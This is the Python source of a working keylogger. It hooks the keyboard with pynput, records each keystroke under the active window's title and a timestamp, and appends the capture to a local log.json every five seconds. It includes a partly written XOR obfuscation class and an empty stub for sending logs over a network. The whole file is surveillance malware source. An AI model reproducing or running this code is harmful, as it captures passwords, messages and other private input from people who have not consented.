import time
from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
from abc import ABC, abstractmethod
import json

class KeyLoggerService:

    def __init__(self):
        self.data = {}

    def get_data(self):
        data = self.data.copy()
        self.data.clear()
        return data

    def get_keyword(self, key):
        window = self._get_window()
        if window not in self.data:
            self.data[window] = {}
        time = self._get_time()
        if time not in self.data[window]:
            self.data[window][time] = ""

        if hasattr(key, 'char') and key is not None:
            self.data[window][time] += key.char
        elif str(key) == "Key.space":
            self.data[window][time] += " "
        else:
            self.data[window][time] += f" [{key}] "

    def _get_time(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M")

    def _get_window(self):
        return gw.getActiveWindow().title

class Write:
    @abstractmethod
    def write(self, data):
        pass

class FileWriter(Write):
    def write(self, data: dict):
        try:
            with open("log.json", "r") as file:
                try:
                    origin_data = json.load(file)
                except json.JSONDecodeError:
                    origin_data = {}
        except FileNotFoundError:
            origin_data = {}

        for window in data:
            if window not in origin_data:
                origin_data[window] = {}
            for time in data[window]:
                if time not in origin_data[window]:
                    origin_data[window][time] = ""
                origin_data[window][time] += str(data[window][time])

        with open("log.json", "w") as file:
            json.dump(origin_data, file, indent=4)

class Encryptor:

    def __init__(self):
        self.encrypted_key = 1021210201

    def encrypt(self, string):
        result = []
        for letter in string:
            result.append(ord(letter) ^ self.encrypted_key)

        return result


    def _xor(self, data):
        encrypted_data = {}
        for window in data:
            new_window = self.encrypt(window)
            encrypted_data[new_window] = {}
            for time in data[window]:
                new_time = self.encrypt(time)
                encrypted_data[new_window][new_time] = self.encrypt(data[window][time])

        return encrypted_data


class NetworkWriter():
    pass

class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        self.encryptor = Encryptor()
        self.listener = keyboard.Listener(
            on_press=self.service.get_keyword
        )

    def start(self):
        self.listener.start()
        print("Keylogger is starting!")
        while True:
            time.sleep(5)
            data = self.service.get_data()
            # encrypted_data = self.encryptor.encrypt(data)
            self.writer.write(data)

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
